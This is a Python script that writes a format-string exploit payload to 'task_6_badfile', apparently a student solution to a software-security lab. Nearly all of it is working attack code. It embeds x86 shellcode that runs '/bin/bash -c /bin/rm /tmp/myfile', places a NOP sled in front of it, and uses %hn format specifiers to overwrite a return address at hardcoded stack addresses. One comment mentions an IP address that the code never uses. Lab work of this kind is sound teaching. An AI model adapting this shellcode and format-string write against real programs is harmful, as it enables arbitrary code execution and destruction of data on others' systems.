#!/usr/bin/python3
import sys

# Run "/bin/bash -c '/bin/rm /tmp/myfile'"
malicious_code = (
    # Push the command '/bin////bash' into stack (//// is equivalent to /)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""bash"                    # pushl "bash"
    "\x68""////"                    # pushl "////"
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe3"                      # movl %esp, %ebx

    # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""-ccc"                    # pushl "-ccc"
    "\x89\xe0"                      # movl %esp, %eax

    # Push the 2nd argument into the stack:
    #       '/bin/rm /tmp/myfile'
    # Students need to use their own VM's IP address
    "\x31\xd2"                      # xorl %edx,%edx
    "\x52"                          # pushl %edx
    "\x68""    "                    # pushl (an integer) --> 1
    "\x68""ile "                    # pushl (an integer)
    "\x68""/myf"                    # pushl (an integer)
    "\x68""/tmp"                    # pushl (an integer)
    "\x68""/rm "                    # pushl (an integer)
    "\x68""/bin"                    # pushl (an integer) --> 2
    "\x89\xe2"                      # movl %esp,%edx

    # Construct the argv[] array and set ecx
    "\x31\xc9"                      # xorl %ecx,%ecx
    "\x51"                          # pushl %ecx
    "\x52"                          # pushl %edx
    "\x50"                          # pushl %eax
    "\x53"                          # pushl %ebx
    "\x89\xe1"                      # movl %esp,%ecx

    # Set edx to 0
    "\x31\xd2"                      # xorl %edx,%edx

    # Invoke the system call
    "\x31\xc0"                      # xorl %eax,%eax
    "\xb0\x0b"                      # movb $0x0b,%al
    "\xcd\x80"                      # int $0x80
).encode('latin-1')


N = 1200
INPUT_ARRAY_OFFSET = 500

# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the code at the end
start = N - len(malicious_code)
content[start:] = malicious_code

# The address of the input array: 0xffffd0f0
# The ebp value inside myprintf() is: 0xffffd0a8
# Return address is 4 bytes above frame pointer

return_address = 0xffffd0ac
input_array_address = 0xffffd0f0

# This will be written to return_address
target_address_value = input_array_address + INPUT_ARRAY_OFFSET

last_two_bytes = 0xffffd0ae
first_two_bytes = 0xffffd0ac

content[0:4] = last_two_bytes.to_bytes(4, byteorder='little')
content[4:8] = b"@@@@"
content[8:12] = first_two_bytes.to_bytes(4, byteorder='little')

# To write: 0xffffd4d8

small = 0xffff - 12 - 240
large = (0x10000 - 0xffff - 1) + 0xd2e4
s = "%.8x" * 30
s += "%." + str(small) + "x" + "%hn"
s += "%." + str(large) + "x" + "%hn"

fmt = (s).encode('latin-1')
content[12: 12 + len(fmt)] = fmt

# Write the content to badfile
file = open("task_6_badfile", "wb")
file.write(content)
file.close()
